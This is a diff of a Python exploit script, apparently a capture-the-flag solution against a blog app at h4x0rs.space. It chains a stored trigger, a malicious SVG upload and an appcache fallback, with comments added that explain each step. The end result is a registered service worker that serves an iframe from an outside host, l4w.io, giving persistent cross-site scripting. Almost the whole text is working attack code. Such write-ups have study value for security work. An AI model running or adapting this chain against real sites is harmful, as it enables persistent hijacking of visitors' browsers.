@@ -5,12 +5,17 @@ import base64
 
 URL = 'https://h4x0rs.space/blog/'
 
+
+
 # CALLBACK to get Persistent XSS
 trigger = """`;onfetch=(e)=>{e.respondWith(new Response('<iframe src=//l4w.io>',{headers:{'Content-Type':'text/html'}}))}//"""
 values = {'title':trigger,'pad':trigger,'submit':'go'}
 
 r1 = requests.post(URL+'create.php', data=values)
 callback_path = re.findall('id=([a-f0-9]{64})',r1.text)[0]
+
+
+
 
 # SVG
 eval_script = """navigator.serviceWorker.register("/blog/pad.php?id=%s&callback=%%60",{'scope':'/blog/'}).then(function(registration) {
@@ -33,12 +38,12 @@ svgfile = """<?xml version="1.0" standalone="no"?>
 f = open('./svgfile.svg','wb')
 f.write(svgfile)
 f.close()
-
 files = {'image': open('./svgfile.svg','rb')}
 values = {'title':'abc','pad':'def','submit':'go'}
-
 r1 = requests.post(URL+'create.php', files=files, data=values)
 svgfile_path = re.findall('id=([a-f0-9]{64})',r1.text)[0]
+
+
 
 
 # CACHE MANIFEST FILE
@@ -54,17 +59,19 @@ values = {'title':'abc','pad':'def','submit':'go'}
 r1 = requests.post(URL+'create.php', files=files, data=values)
 appcache_path = re.findall('id=([a-f0-9]{64})',r1.text)[0]
 
+
+
 # TRIGGER
 trigger = """
 [yt]{0}[/yt]
 """.format(
 	urllib.quote('--><html manifest=/blog/untrusted_files/{0}.jpg>'.format(appcache_path)).replace('/','%2f'))
-# trigger += "[yt]mvD7XDmfhcc[/yt][br][ig]Bf-wJuDji1G[/ig]";
+
 for i in range(40):
-	trigger += "[yt]"+str(i)+"[/yt]";
-trigger += "[yt]#[/yt]"
-# for i in range(2):
-# 	trigger += "[ig]"+str(i)+"#[/ig]"
+	trigger += "[yt]"+str(i)+"[/yt]"; # Why have to do this ? it's just because loading appcache needs time, so I designed a mechainsm let loading iframes one by one, and delay it for 40*20 miliseconds.
+trigger += "[yt]#[/yt]" # then now, trigger the bug, use hashtag to remove parameter &p= -> turn into 500 -> error -> fallback triggered -> loading svg
+
+# SVG -> eval evil code -> Use callback pad.php to setup serviceworker to get persistent XSS
 
 values = {'title':'abc','pad':trigger,'submit':'go'}
 r1 = requests.post(URL+'create.php', data=values)
